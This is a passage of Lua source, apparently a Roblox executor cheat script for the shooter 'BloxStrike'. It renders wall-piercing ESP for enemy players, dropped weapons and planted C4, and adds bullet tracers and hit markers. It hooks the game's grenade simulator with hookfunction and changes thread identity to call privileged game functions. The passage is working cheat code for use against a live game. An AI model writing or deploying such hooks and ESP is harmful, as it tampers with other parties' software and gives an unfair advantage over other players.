							Part.Anchored = true
							Part.CanCollide = false
							Part.CanQuery = false
							Part.CanTouch = false
							Part.CFrame = CFrame.new(arg)
							Part.Parent = terrain
							BillboardGui.Name = "BloxStrikeHitMarkGui"
							BillboardGui.Adornee = Part
							local n3 = math.clamp(fn11("BloxStrike Hit Mark Scale", 100), 25, 300) / 100
							BillboardGui.Size = UDim2.fromOffset(100 * n3, 100 * n3)
							BillboardGui.AlwaysOnTop = true
							BillboardGui.LightInfluence = 0
							BillboardGui.Parent = Part
							local tbl16 = {}
							local tbl17 = { Position = UDim2.fromScale(0.42, 0.42), Rotation = -45 }
							local tbl18 = { Position = UDim2.fromScale(0.55, 0.42), Rotation = 45 }
							local tbl19 = { Position = UDim2.fromScale(0.42, 0.55), Rotation = 45 }
							local tbl20 = { Position = UDim2.fromScale(0.55, 0.55), Rotation = -45 }
							tbl16[1] = tbl17
							tbl16[2] = tbl18
							tbl16[3] = tbl19
							tbl16[4] = tbl20
							local tbl21 = {}

							for _, v13 in ipairs(tbl16) do
								local Frame = fn34("Frame")
								local UIStroke = fn34("UIStroke")

								if not Frame or not UIStroke then
									if Frame then
										Frame:Destroy()
									end

									if UIStroke then
										UIStroke:Destroy()
									end

									Part:Destroy()
									return
								end

								Frame.AnchorPoint = Vector2.new(0.55000001192092896, 0.55000001192092896)
								Frame.Position = v13.Position
								Frame.Size = UDim2.fromOffset(1.2, 7)
								Frame.Rotation = v13.Rotation
								Frame.BorderSizePixel = 0
								Frame.BackgroundColor3 = Color3.new(1, 1, 1)
								Frame.BackgroundTransparency = 1
								Frame.Parent = BillboardGui
								UIStroke.Color = Color3.new(0, 0, 0)
								UIStroke.Thickness = 1
								UIStroke.Transparency = 1
								UIStroke.Parent = Frame
								tbl21[#tbl21 + 1] = { Line = Frame, Outline = UIStroke }
							end

							for _, v13 in ipairs(tbl21) do
								pcall(function()
									tbl4.TweenService:Create(v13.Line, TweenInfo.new(0.35), { BackgroundTransparency = 0 }):Play()
									tbl4.TweenService:Create(v13.Outline, TweenInfo.new(0.35), { Transparency = 0 }):Play()
								end)
							end

							task.delay(math.max(fn11("BloxStrike Hit Mark Lifetime", 3), 0.1), function()
								for _, v13 in ipairs(tbl21) do
									pcall(function()
										tbl4.TweenService:Create(v13.Line, TweenInfo.new(0.35), { BackgroundTransparency = 1 }):Play()
										tbl4.TweenService:Create(v13.Outline, TweenInfo.new(0.35), { Transparency = 1 }):Play()
									end)
								end

								task.wait(0.35)

								if Part.Parent then
									Part:Destroy()
								end
							end)
						end

						local function fn42(arg)
							if not arg then
								return false
							end

							local ok4, result4 = pcall(function()
								return arg:FindFirstAncestorOfClass("Model")
							end)

							if not ok4 or not result4 then
								return false
							end
							local playerFromCharacter = tbl4.Players:GetPlayerFromCharacter(result4)
							if playerFromCharacter and playerFromCharacter ~= localPlayer2 then
								return fn29(playerFromCharacter)
							end

							for _, player in ipairs(tbl4.Players:GetPlayers()) do
								if player ~= localPlayer2 and fn29(player) then
									local v13 = fn24(player)

									if v13 then
										local ok5, result5 = pcall(arg.IsDescendantOf, arg, v13)
										if result4 == v13 or ok5 and result5 then
											return true
										end
									end
								end
							end

							return false
						end

						local function fn43(arg)
							if type(arg) ~= "string" then
								return nil
							end
							local str3 = arg:gsub("^%s+", ""):gsub("%s+$", "")
							if str3 == "" then
								return nil
							end

							if not str3:find("://", 1, true) then
								return "rbxassetid://" .. str3
							end
							return str3
						end

						local function fn44()
							if not fn9("BloxStrike Hit Sound") then
								return
							end

							if fn12("BloxStrike Hit Sound Style", "Default") ~= "Custom" then
								return
							end
							local bloxStrikeHitSoundId = fn12("BloxStrike Hit Sound ID", "6607204501")
							local v13 = fn43(bloxStrikeHitSoundId)
							local currentCamera = tbl4.Workspace.CurrentCamera
							if not v13 or not currentCamera then
								return
							end
							local Sound = fn34("Sound")
							if not Sound then
								return
							end
							Sound.SoundId = v13
							Sound.Volume = 1
							Sound.Parent = currentCamera
							Sound:Play()
							tbl4.Debris:AddItem(Sound, 1)
						end

						local function fn45(arg)
							if not arg then
								return
							end

							local ok4, result4, result5, result6 = pcall(function()
								return arg.Position, arg.Normal, arg.Instance
							end)

							if not ok4 or typeof(result4) ~= "Vector3" then
								return
							end

							if fn9("BloxStrike Bullet Impacts") then
								fn40(result4, result5)
							end

							if fn42(result6) then
								if fn9("BloxStrike Hit Mark") then
									fn41(result4)
								end

								fn44()
							end
						end

						local fn46 = nil

						fn46 = function(arg, arg2, arg3, arg4)
							if #arg2 >= 4 then
								return
							end

							if typeof(arg) == "Vector3" then
								arg2[#arg2 + 1] = arg
								return
							end

							if type(arg) ~= "table" or arg4 >= 2 or arg3[arg] then
								return
							end
							arg3[arg] = true

							for _, v13 in pairs(arg) do
								fn46(v13, arg2, arg3, arg4 + 1)
							end
						end

						local fn47 = nil

						fn47 = function(arg, arg2, arg3)
							if arg3 >= 2 then
								return nil
							end

							if type(arg) == "string" then
								if arg == "Local" or arg == "Team" or arg == "Enemy" then
									return arg
								end
								return nil
							end

							if typeof(arg) == "Instance" then
								local isPlayer = arg:IsA("Player") and arg or tbl4.Players:GetPlayerFromCharacter(arg)
								if not isPlayer then
									return nil
								end

								if not fn27(isPlayer) or not fn27(localPlayer2) then
									return nil
								end

								if isPlayer == localPlayer2 then
									return "Local"
								end
								return fn29(isPlayer) and "Enemy" or "Team"
							end

							if type(arg) ~= "table" or arg2[arg] then
								return nil
							end
							arg2[arg] = true

							for _, v13 in pairs(arg) do
								local v14 = fn47(v13, arg2, arg3 + 1)
								if v14 then
									return v14
								end
							end

							return nil
						end

						local function fn48()
							local networkRemotes = tbl4.ReplicatedStorage:FindFirstChild("NetworkRemotes")
							networkRemotes = networkRemotes and networkRemotes:FindFirstChild("VFX")
							networkRemotes = networkRemotes and networkRemotes:FindFirstChild("CreateTracer")
							if not networkRemotes or not networkRemotes:IsA("RemoteEvent") then
								return
							end
							local genv = type(getgenv) == "function" and getgenv() or _G

							if genv.BloxStrikeBulletTracerConnection then
								pcall(genv.BloxStrikeBulletTracerConnection.Disconnect, genv.BloxStrikeBulletTracerConnection)
							end

							genv.BloxStrikeBulletTracerConnection = networkRemotes.OnClientEvent:Connect(function(...)
								local v13 = table.pack(...)
								if not fn9("BloxStrike Bullet Tracer") then
									return
								end
								local tbl16 = {}
								local tbl17 = {}
								local str3

								for i = 1, select("#", ...) do
									local value = select(i, table.unpack(v13, 1, v13.n))
									fn46(value, tbl16, tbl17, 0)
									local v14 = fn47(value, {}, 0)

									if not str3 and v14 then
										str3 = v14
									end
								end

								if #tbl16 >= 2 then
									str3 = str3 or "Enemy"
									local v14 = tbl16[1]
									local n3 = tbl16[2]

									if n3.Magnitude <= 2 then
										n3 = v14 + n3.Unit * 2000
									end

									fn38(v14, n3, str3)
								end
							end)
						end

						local v13 = createTextLabel()
						v13.TextSize = 18

						local function fn49(player)
							if player ~= localPlayer2 and not tbl6[player] then
								tbl6[player] = { NameText = createTextLabel(), DistanceText = createTextLabel(), Icons = {} }
							end
						end

						local function fn50(player)
							local v14 = tbl6[player]

							if v14 then
								local distanceText = v14.DistanceText
								v14.NameText.Visible = false
								distanceText.Visible = false
								v14.NameText:Destroy()
								v14.DistanceText:Destroy()

								for _, icon in pairs(v14.Icons) do
									icon:Destroy()
								end

								tbl6[player] = nil
							end
						end

						local function fn51(arg)
							if not tbl7[arg] then
								tbl7[arg] = { Text = createTextLabel(), Highlight = createHighlight() }
							end
						end

						local function fn52(arg)
							local v14 = tbl7[arg]

							if v14 then
								v14.Text.Visible = false
								v14.Text:Destroy()
								pcall(v14.Highlight.Destroy, v14.Highlight)
								tbl7[arg] = nil
							end
						end

						local function fn53(arg, arg2)
							tbl14 = { Key = arg, Color = arg2, Expires = os.clock() + 1.5 }
						end

						local function fn54(arg)
							if tbl8[arg] then
								return
							end
							tbl8[arg] = { Text = createTextLabel() }

							fn17(arg:GetAttributeChangedSignal("Exploding"):Connect(function()
								if arg:GetAttribute("Exploding") == true then
									fn53("C4 EXPLODING", Color3.fromRGB(255, 90, 90))
								end
							end))

							fn17(arg:GetAttributeChangedSignal("Exploded"):Connect(function()
								if arg:GetAttribute("Exploded") == true then
									fn53("C4 EXPLODED", Color3.fromRGB(255, 60, 60))
								end
							end))

							fn17(arg:GetAttributeChangedSignal("Defused"):Connect(function()
								if arg:GetAttribute("Defused") == true then
									fn53("C4 DEFUSED", Color3.fromRGB(90, 210, 255))
								end
							end))
						end

						local function fn55(arg)
							local v14 = tbl8[arg]

							if v14 then
								v14.Text.Visible = false
								v14.Text:Destroy()
								tbl8[arg] = nil
							end
						end

						local function fn56()
							n = 0
							n2 = 0
						end

						local function fn57()
							for i = n + 1, #tbl10 do
								tbl10[i].Visible = false
							end

							for i = n2 + 1, #tbl11 do
								tbl11[i].Visible = false
							end
						end

						local function fn58(from, to, color)
							n += 1
							local Line = tbl10[n]

							if not Line then
								Line = fn18("Line", { Visible = false, Thickness = 1.5, Transparency = 1 })
								tbl10[n] = Line
							end

							Line.From = from
							Line.To = to
							Line.Color = color
							Line.Visible = true
						end

						local function fn59(position, color)
							n2 += 1
							local Circle = tbl11[n2]

							if not Circle then
								Circle = fn18("Circle", { Visible = false, Filled = true, Radius = 3, NumSides = 12, Transparency = 1 })
								tbl11[n2] = Circle
							end

							Circle.Position = position
							Circle.Color = color
							Circle.Visible = true
						end

						local function fn60(arg, arg2, arg3)
							local tbl16 = arg or {}

							for i = 2, #tbl16 do
								local v14, v15 = fn32(arg[i - 1])
								local v16, v17 = fn32(arg[i])

								if v15 and v17 then
									fn58(v14, v16, arg3)
								end
							end

							local v14 = ipairs
							arg2 = arg2 or {}

							for _, v15 in v14(arg2) do
								local v16, v17 = fn32(v15)

								if v17 then
									fn59(v16, arg3)
								end
							end
						end

						local function fn61(arg, arg2, arg3)
							if not v10 or type(arg) ~= "table" or type(arg2) ~= "table" then
								return nil, nil
							end
							local tbl16 = { arg.position }
							local tbl17 = {}
							local state = table.clone(arg)

							for i = 1, 40 do
								local ok4, result4 = pcall(v10, state, arg2, arg3, 0.075)

								if not (not ok4 or type(result4) ~= "table" or type(result4.state) ~= "table") then
									state = result4.state
									table.insert(tbl16, state.position)
									local flag = state.isAtRest == true
									local v14 = ipairs
									local events = result4.events or {}

									for _, event in v14(events) do
										if event.type == "bounce" and typeof(event.position) == "Vector3" then
											table.insert(tbl17, event.position)
										elseif event.type == "fuse" or event.type == "impact" or event.type == "floor_impact" and arg2.explodeOnFloorImpact == true then
											flag = true
										end
									end

									if not flag then
										continue
									end
								end

								break
							end

							return tbl16, tbl17
						end

						local function fn62(arg, config, params)
							if type(arg) ~= "table" or typeof(arg.position) ~= "Vector3" then
								return
							end
							local huge = math.huge
							local v14 = nil

							for _, v15 in ipairs(tbl4.CollectionService:GetTagged("Grenade")) do
								if v15:IsA("Model") and v15.PrimaryPart then
									local magnitude = (v15.PrimaryPart.Position - arg.position).Magnitude

									if magnitude < huge then
										huge = magnitude
										v14 = v15
									end
								end
							end

							if v14 and huge <= 12 then
								local tbl16 = tbl9[v14] or {}
								tbl16.State = table.clone(arg)
								tbl16.Config = config
								tbl16.Params = params
								tbl16.Seen = os.clock()
								tbl16.Dirty = true
								tbl9[v14] = tbl16
								local attribute = v14:GetAttribute("Weapon") or v14:GetAttribute("Name") or v14.Name

								if type(attribute) == "string" and type(config) == "table" then
									tbl13[attribute] = config
								end
							end
						end

						local function fn63()
							local grenadeSimulator = tbl5.GrenadeSimulator
							if not grenadeSimulator or type(grenadeSimulator.simulate) ~= "function" or type(hookfunction) ~= "function" then
								return
							end

							local fn64 = type(newcclosure) == "function" and newcclosure or function(arg)
								return arg
							end

							local simulate = grenadeSimulator.simulate
							local v14 = nil

							local function fn65(arg, arg2, arg3, arg4)
								if tbl2.Running then
									if not pcall(fn62, arg, arg2, arg3) then
										return v14(arg, arg2, arg3, arg4)
									end
								end

								return v14(arg, arg2, arg3, arg4)
							end

							v14 = hookfunction
							v14 = v14(simulate, fn64(fn65))
							v10 = v14
						end

						local function fn64(configAttempt)
							if not fn15("BloxStrike Grenade Trajectory Elements", "Held", {}) or not tbl5.InventoryController or not tbl5.GrenadeSimulator then
								return nil
							end
							local ok4, result4 = pcall(tbl5.InventoryController.getCurrentEquipped)
							if not ok4 or type(result4) ~= "table" or not result4.Properties or result4.Properties.Class ~= "Grenade" then
								return nil
							end
							local currentCamera = tbl4.Workspace.CurrentCamera
							local v14 = fn20()
							local character = v14 and v14.Character or fn21()
							if not currentCamera or not v14 or not character or not character.PrimaryPart then
								return nil
							end
							local name = result4.Properties.Name or result4.Properties.Weapon or result4.Properties.Id or result4.Name
							local flag = tbl5.InputController and type(tbl5.InputController.isActionActive) == "function"
							local flag2 = nil

							if flag then
								local ok5, result5 = pcall(tbl5.InputController.isActionActive, "SecondaryFire")
								flag2 = nil

								if ok5 then
									flag2 = result5 == true
								end
							end

							if flag2 ~= true then
								local result5
								flag2, result5 = pcall(tbl4.UserInputService.IsMouseButtonPressed, tbl4.UserInputService, Enum.UserInputType.MouseButton2)
								flag2 = flag2 and result5 == true
							end

							local mode = "Far"

							if flag2 then
								mode = "Near"
							end

							local flag3 = tbl12.Mode ~= mode

							if tbl12.WeaponName ~= name then
								tbl12 = { Updated = -math.huge, Interval = 0.05, WeaponName = name }
							elseif flag3 then
								local v15 = tbl12
								tbl12.Mode = mode
								v15.Config = nil
								local v16 = tbl12
								local v17 = tbl12
								tbl12.Points = nil
								v16.Bounces = nil
								v17.Updated = -math.huge
							end

							if tbl12.PropertiesResolved ~= true then
								tbl12.PropertiesResolved = true

								if type(tbl5.GetWeaponProperties) == "function" and type(name) == "string" then
									local ok5, properties = pcall(function()
										return fn30(2, function()
											return tbl5.GetWeaponProperties(name)
										end)
									end)

									if ok5 and type(properties) == "table" then
										tbl12.Properties = properties
									end
								end
							end

							if not tbl12.Static then
								local function fn65(arg)
									for _, v15 in ipairs({ result4, result4.Properties, tbl12.Properties }) do
										if type(v15) ~= "table" then
											continue
										end

										for _, v16 in ipairs(arg) do
											if v15[v16] ~= nil then
												return v15[v16]
											end
										end
									end

									return nil
								end

								local v15 = fn65({ "RangeScale", "rangeScale" })
								local v16 = fn65({ "ThrowPower", "throwPower", "ThrowStrength", "throwStrength" })
								local v17 = fn65({ "ExplodeOnFloorImpact", "explodeOnFloorImpact" })

								tbl12.Static = {
									RangeScale = type(v15) == "number" and v15 or 1,
									ThrowPower = type(v16) == "number" and v16 or 1,
									FuseTime = fn65({ "FuseTime", "fuseTime", "Fuse", "fuse" }),
									MinimumFuseTime = fn65({ "MinimumFuseTime", "minimumFuseTime", "MinimumFuse", "minimumFuse" }),
									Radius = fn65({ "Radius", "radius" }),
									Restitution = fn65({ "Restitution", "restitution" }),
									MaxBounces = fn65({ "MaxBounces", "maxBounces" }),
									ExplodeOnFloorImpact = v17 == true or v17 == 1,
								}
							end

							local static = tbl12.Static

							if not tbl12.Config then
								local configFailed = tbl12.ConfigFailed

								if configFailed then
									configFailed = configAttempt - (tbl12.ConfigAttempt or 0) < tbl12.Interval
								end

								if configFailed then
									return tbl12.Points and tbl12 or nil
								end
								tbl12.ConfigAttempt = configAttempt
								local constants = tbl5.GrenadeSimulator.Constants or {}
								local config = type(name) == "string" and tbl13[name] or nil
								local flag4

								if type(config) == "table" then
									flag4 = true
								else
									flag4, config = pcall(tbl5.GrenadeSimulator.createConfig, type(static.Radius) == "number" and static.Radius or constants.GRENADE_RADIUS or 0.4, type(static.Restitution) == "number" and static.Restitution or constants.GRENADE_ELASTICITY or 0.4, type(static.MaxBounces) == "number" and static.MaxBounces or constants.MAX_BOUNCES or 20, static.FuseTime, static.MinimumFuseTime, static.ExplodeOnFloorImpact, static.RangeScale, mode == "Near")
								end

								if not flag4 or type(config) ~= "table" then
									tbl12.ConfigFailed = true
									return tbl12.Points and tbl12 or nil
								end
								local v15 = tbl12
								local v16 = tbl12
								tbl12.Config = config
								v15.Mode = mode
								v16.ConfigFailed = false
							end

							if tbl12.ParamsCamera ~= currentCamera or tbl12.ParamsCharacter ~= character then
								local raycastParams = RaycastParams.new()
								raycastParams.FilterType = Enum.RaycastFilterType.Exclude
								local v15 = fn10
								local tbl16 = {}
								local debris = tbl4.Workspace:FindFirstChild("Debris")
								tbl16[1] = currentCamera
								tbl16[2] = debris
								tbl16[3] = character
								raycastParams.FilterDescendantsInstances = v15(tbl16)

								pcall(function()
									raycastParams.CollisionGroup = "Bullet"
								end)

								raycastParams.RespectCanCollide = false
								raycastParams.IgnoreWater = true
								local v16 = tbl12
								local v17 = tbl12
								tbl12.Params = raycastParams
								v16.ParamsCamera = currentCamera
								v17.ParamsCharacter = character
								tbl12.Updated = -math.huge
							end

							local cFrame = currentCamera.CFrame
							local globalVelocity = v14.GlobalVelocity

							if typeof(globalVelocity) ~= "Vector3" then
								globalVelocity = Vector3.zero
							end

							local inputCameraCFrame = tbl12.InputCameraCFrame
							local flag4 = not inputCameraCFrame or (cFrame.Position - inputCameraCFrame.Position).Magnitude > 0.02 or cFrame.LookVector:Dot(inputCameraCFrame.LookVector) < 0.99999
							if tbl12.Points and not flag4 and not (not tbl12.VelocityHint or (globalVelocity - tbl12.VelocityHint).Magnitude > 0.15) then
								return tbl12
							end

							if configAttempt - tbl12.Updated < tbl12.Interval then
								return tbl12.Points and tbl12 or nil
							end
							local globalVelocity2 = v14.GlobalVelocity or Vector3.zero

							if tbl5.RuntimeKinematics then
								local ok5, result5 = pcall(tbl5.RuntimeKinematics.getVelocity, character, character.PrimaryPart)

								if ok5 and typeof(result5) == "Vector3" then
									globalVelocity2 = result5
								end
							end

							local flag5 = tbl5.CameraController and type(tbl5.CameraController.toWeaponFirePosition) == "function"
							local cameraCFrame = nil

							if flag5 then
								local ok5
								ok5, cameraCFrame = pcall(tbl5.CameraController.toWeaponFirePosition)
								ok5 = ok5 and typeof(cameraCFrame) == "CFrame"
								local v15 = nil

								if not ok5 then
									cameraCFrame = v15
								end
							end

							cameraCFrame = cameraCFrame or currentCamera.CFrame
							local v15, v16 = tbl5.GrenadeSimulator.calculateThrowParameters(cameraCFrame.Position, cameraCFrame.LookVector, mode, static.ThrowPower)
							local v17, v18 = fn61(tbl5.GrenadeSimulator.createInitialState(v15, v16, mode, globalVelocity2, static.RangeScale, tbl4.Workspace:GetServerTimeNow()), tbl12.Config, tbl12.Params)

							if v17 then
								local v19 = tbl12
								tbl12.Points = v17
								v19.Bounces = v18
							end

							local v19 = tbl12
							tbl12.CameraCFrame = cameraCFrame
							v19.InputCameraCFrame = cFrame
							local v20 = tbl12
							tbl12.Velocity = globalVelocity2
							v20.VelocityHint = globalVelocity
							tbl12.Updated = configAttempt
							return tbl12.Points and tbl12 or nil
						end

						local screenGui2 = Instance.new("ScreenGui")
						screenGui2.Name = "BloxStrikePlayerIcons"
						screenGui2.IgnoreGuiInset = true
						screenGui2.ResetOnSpawn = false
						screenGui2.DisplayOrder = 10
						screenGui2.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
						screenGui2.Parent = localPlayer2:WaitForChild("PlayerGui")
						local tbl16 = {}

						local function fn65(arg)
							if type(arg) ~= "string" or arg == "" then
								return nil
							end

							if tbl16[arg] ~= nil then
								return tbl16[arg] or nil
							end

							if type(tbl5.GetWeaponProperties) ~= "function" then
								return nil
							end
							local flag = type(getthreadidentity) == "function" and type(setthreadidentity) == "function"
							local v14 = nil

							if flag then
								v14 = getthreadidentity()
								setthreadidentity(2)
							end

							local ok4, result4 = pcall(tbl5.GetWeaponProperties, arg)

							if v14 then
								setthreadidentity(v14)
							end

							if not ok4 then
								return nil
							end
							local icon = type(result4) == "table" and result4.Icon

							if not icon or icon == "" then
								icon = type(result4) == "table" and result4.ReverseIcon
							end

							if type(icon) == "number" then
								icon = "rbxassetid://" .. icon
							end

							tbl16[arg] = type(icon) == "string" and icon ~= "" and icon or false
							return tbl16[arg] or nil
						end

						local function fn66(arg, name, image, arg2, arg3, arg4, arg5, imageColor3)
							local imageLabel = arg.Icons[name]

							if not imageLabel then
								imageLabel = Instance.new("ImageLabel")
								imageLabel.Name = name
								imageLabel.BackgroundTransparency = 1
								imageLabel.Active = false
								imageLabel.Selectable = false
								imageLabel.AnchorPoint = Vector2.new(0.5, 0)
								imageLabel.ScaleType = Enum.ScaleType.Fit
								imageLabel.Parent = screenGui2
								arg.Icons[name] = imageLabel
							end

							imageLabel.Image = image
							imageLabel.ImageColor3 = imageColor3
							local udim2 = UDim2.fromOffset(arg2, arg3)
							local udim22 = UDim2.fromOffset(arg4, arg5)
							imageLabel.Position = udim2
							imageLabel.Size = udim22
							imageLabel.Visible = true
						end

						local function fn67(arg, arg2)
							local x = arg2.X
							local y = arg2.Y
							local n3 = math.abs(arg.RightVector.Y) * x + math.abs(arg.UpVector.Y) * y
							local z = arg2.Z
							return (n3 + math.abs(arg.LookVector.Y) * z) * 0.5
						end

						local function fn68(arg)
							local v14 = nil

							for _, v15 in ipairs({ "LeftFoot", "RightFoot", "Left Leg", "Right Leg" }) do
								local v16 = arg:FindFirstChild(v15)

								if v16 and v16:IsA("BasePart") then
									local n3 = v16.Position - Vector3.new(0, fn67(v16.CFrame, v16.Size), 0)

									if not v14 or n3.Y < v14.Y then
										v14 = n3
									end
								end
							end

							if v14 then
								local position = arg.PrimaryPart.Position
								return Vector3.new(position.X, v14.Y, position.Z)
							end
							local boundingBox, v15 = arg:GetBoundingBox()
							return boundingBox.Position - Vector3.new(0, fn67(boundingBox, v15), 0)
						end

						local function fn69(arg, arg2)
							if v9 and type(v9.GetTool) == "function" then
								local ok4, result4 = pcall(v9.GetTool, arg, arg2)
								if type(result4) == "string" then
									return result4
								end

								if ok4 and type(result4) == "table" then
									return result4.Name or result4.name
								end
							end

							return fn23(arg2, "CurrentEquipped")
						end

						local function fn70(arg)
							local tbl17 = { "Name", "Distance", "Model", "Weapon", "Grenade", "C4", "Health", "HealthBar" }
							local bloxStrikePlayerEspElements = fn16("BloxStrike Player ESP Elements", tbl17)
							local currentCamera = tbl4.Workspace.CurrentCamera
							local bloxStrikeEspTextColor = fn13("BloxStrike ESP Text Color", Color3.new(1, 1, 1))
							local bloxStrikePlayerEspDistance = fn11("BloxStrike Player ESP Distance", 3000)
							local bloxStrikeEspTextSize = fn11("BloxStrike ESP Text Size", 14)
							local n3 = fn11("BloxStrike ESP Icon Size", 100) / 100

							for k, v14 in pairs(tbl6) do
								local distanceText = v14.DistanceText
								v14.NameText.Visible = false
								distanceText.Visible = false

								for _, icon in pairs(v14.Icons) do
									icon.Visible = false
								end

								local v15 = fn24(k)

								if v9 and type(v9.GetCharacter) == "function" then
									local ok4, result4 = pcall(v9.GetCharacter, k)

									if ok4 and typeof(result4) == "Instance" then
										v15 = result4
									end
								end

								if v15 and (not v15.Parent or not v15.PrimaryPart) then
									v15 = nil
								end

								local flag = bloxStrikePlayerEspElements and currentCamera and arg and fn29(k) and fn25(k, v15)
								local magnitude = flag and (v15.PrimaryPart.Position - arg).Magnitude or math.huge
								flag = flag and magnitude <= bloxStrikePlayerEspDistance
								v14.Character = v15

								if flag then
									local v16, v17 = fn32(fn68(v15))

									if v17 then
										local n4 = v16.Y + 4

										if v9 and fn15("BloxStrike Player ESP Elements", "Distance", tbl17) then
											local n5 = n4 + bloxStrikeEspTextSize + 4
											local y = v14.DistanceText.TextBounds.Y
											n4 = n5 + (y > 0 and y or bloxStrikeEspTextSize) + 4
										elseif not v9 and fn15("BloxStrike Player ESP Elements", "Distance", tbl17) then
											local distanceText2 = v14.DistanceText
											v14.NameText.TextSize = bloxStrikeEspTextSize
											distanceText2.TextSize = bloxStrikeEspTextSize
											local distanceText3 = v14.DistanceText
											v14.NameText.TextColor3 = bloxStrikeEspTextColor
											distanceText3.TextColor3 = bloxStrikeEspTextColor
											local head = v15:FindFirstChild("Head") or v15.PrimaryPart
											local v18, v19 = fn32(head.Position + Vector3.new(0, fn67(head.CFrame, head.Size), 0))

											if v19 and fn15("BloxStrike Player ESP Elements", "Name", tbl17) then
												v14.NameText.Text = k.Name
												v14.NameText.Position = UDim2.fromOffset(v18.X, v18.Y - v14.NameText.TextBounds.Y - 4)
												v14.NameText.Visible = true
											end

											v14.DistanceText.Text = string.format("[%d studs]", math.floor(magnitude + 0.5))
											v14.DistanceText.Position = UDim2.fromOffset(v16.X, n4)
											v14.DistanceText.Visible = true
											n4 += v14.DistanceText.TextBounds.Y + 4
										elseif not v9 and fn15("BloxStrike Player ESP Elements", "Name", tbl17) then
											local nameText = v14.NameText
											v14.NameText.TextSize = bloxStrikeEspTextSize
											nameText.TextColor3 = bloxStrikeEspTextColor
											local head = v15:FindFirstChild("Head") or v15.PrimaryPart
											local v18, v19 = fn32(head.Position + Vector3.new(0, fn67(head.CFrame, head.Size), 0))

											if v19 then
												v14.NameText.Text = k.Name
												v14.NameText.Position = UDim2.fromOffset(v18.X, v18.Y - v14.NameText.TextBounds.Y - 4)
												v14.NameText.Visible = true
											end
										end

										local bloxStrikePlayerEspElements2 = fn15("BloxStrike Player ESP Elements", "Weapon", tbl17) and fn65(fn69(v15, k))

										if bloxStrikePlayerEspElements2 then
											fn66(v14, "Weapon", bloxStrikePlayerEspElements2, v16.X, n4, 64 * n3, 28 * n3, bloxStrikeEspTextColor)
											n4 += 28 * n3 + 4
										end

										local bloxStrikePlayerEspElements3 = fn15("BloxStrike Player ESP Elements", "Grenade", tbl17) and fn65(fn23(k, "Slot4"))
										local c4 = fn15("BloxStrike Player ESP Elements", "C4", tbl17) and fn23(k, "Slot5") == "C4" and fn65("C4")
										local n5 = bloxStrikePlayerEspElements3 and c4 and (22 * n3 + 4) * 0.5 or 0

										if bloxStrikePlayerEspElements3 then
											fn66(v14, "Grenade", bloxStrikePlayerEspElements3, v16.X - n5, n4, 22 * n3, 22 * n3, bloxStrikeEspTextColor)
										end

										if c4 then
											fn66(v14, "C4", c4, v16.X + n5, n4, 22 * n3, 22 * n3, bloxStrikeEspTextColor)
										end
									end
								end
							end
						end

						local function fn71(arg)
							local tbl17 = {}
							local bloxStrikeDroppedEspElements = fn16("BloxStrike Dropped ESP Elements", tbl17)
							local bloxStrikeDroppedEspColor = fn13("BloxStrike Dropped ESP Color", Color3.fromRGB(255, 220, 80))
							local bloxStrikeDroppedEspDistance = fn11("BloxStrike Dropped ESP Distance", 1500)
							local bloxStrikeEspTextSize = fn11("BloxStrike ESP Text Size", 14)

							for k, v14 in pairs(tbl7) do
								local primaryPart = bloxStrikeDroppedEspElements and arg and k.Parent and k.PrimaryPart
								local magnitude = primaryPart and (k.PrimaryPart.Position - arg).Magnitude or math.huge
								primaryPart = primaryPart and magnitude <= bloxStrikeDroppedEspDistance
								local highlight = v14.Highlight
								v14.Highlight.Adornee = k
								highlight.Parent = k
								local highlight2 = v14.Highlight
								v14.Highlight.FillColor = bloxStrikeDroppedEspColor
								highlight2.OutlineColor = bloxStrikeDroppedEspColor
								v14.Highlight.Enabled = primaryPart and fn15("BloxStrike Dropped ESP Elements", "Highlight", tbl17)

								if primaryPart then
									v14.Text.TextSize = bloxStrikeEspTextSize
									local vector2, v15 = fn32(k.PrimaryPart.Position)
									vector2 = vector2 or Vector2.zero
									v14.Text.Position = UDim2.fromOffset(vector2.X, vector2.Y)
									v14.Text.TextColor3 = bloxStrikeDroppedEspColor
									local tbl18 = {}

									if fn15("BloxStrike Dropped ESP Elements", "Name", tbl17) then
										table.insert(tbl18, tostring(k:GetAttribute("Weapon") or "Item"))
									end

									if fn15("BloxStrike Dropped ESP Elements", "Distance", tbl17) then
										table.insert(tbl18, string.format("[%d studs]", math.floor(magnitude + 0.5)))
									end

									v14.Text.Text = table.concat(tbl18, "\n")
									v14.Text.Visible = v15 and #tbl18 > 0
								else
									v14.Text.Visible = false
								end
							end
						end

						local function fn72(arg)
							local tbl17 = { "Status", "Site", "Time", "Distance" }
							local bloxStrikeC4EspElements = fn16("BloxStrike C4 ESP Elements", tbl17)
							local bloxStrikeEspTextSize = fn11("BloxStrike ESP Text Size", 14)

							for k, v14 in pairs(tbl8) do
								if not (bloxStrikeC4EspElements and arg and k.Parent and k.PrimaryPart) then
									v14.Text.Visible = false
								else
									local tbl18 = fn22(k:GetAttribute("BombPlanted")) or {}
									local n3 = math.max((type(tbl18.Time) == "number" and tbl18.Time or tbl4.Workspace:GetServerTimeNow()) + (type(tbl18.TimeUntilExplode) == "number" and tbl18.TimeUntilExplode or 40) - tbl4.Workspace:GetServerTimeNow(), 0)
									local color = Color3.fromRGB(255, 100, 80)
									local str3

									if k:GetAttribute("Defused") == true then
										color = Color3.fromRGB(90, 210, 255)
										str3 = "DEFUSED"
									elseif k:GetAttribute("Exploding") == true then
										color = Color3.fromRGB(255, 50, 50)
										str3 = "EXPLODING"
									else
										str3 = "PLANTED"

										if k:GetAttribute("Exploded") == true then
											color = Color3.fromRGB(255, 50, 50)
											str3 = "EXPLODED"
										end
									end

									local magnitude = (k.PrimaryPart.Position - arg).Magnitude
									v14.Text.TextSize = bloxStrikeEspTextSize
									local vector2, v15 = fn32(k.PrimaryPart.Position + Vector3.new(0, 1, 0))
									vector2 = vector2 or Vector2.zero
									v14.Text.Position = UDim2.fromOffset(vector2.X, vector2.Y)
									v14.Text.TextColor3 = color
									local tbl19 = {}

									if fn15("BloxStrike C4 ESP Elements", "Status", tbl17) then
										table.insert(tbl19, "C4 " .. str3)
									end

									if fn15("BloxStrike C4 ESP Elements", "Site", tbl17) then
										table.insert(tbl19, "Site: " .. tostring(tbl18.Site or "?"))
									end

									if fn15("BloxStrike C4 ESP Elements", "Time", tbl17) then
										table.insert(tbl19, "Time: " .. string.format("%.1fs", n3))
									end

									if fn15("BloxStrike C4 ESP Elements", "Distance", tbl17) then
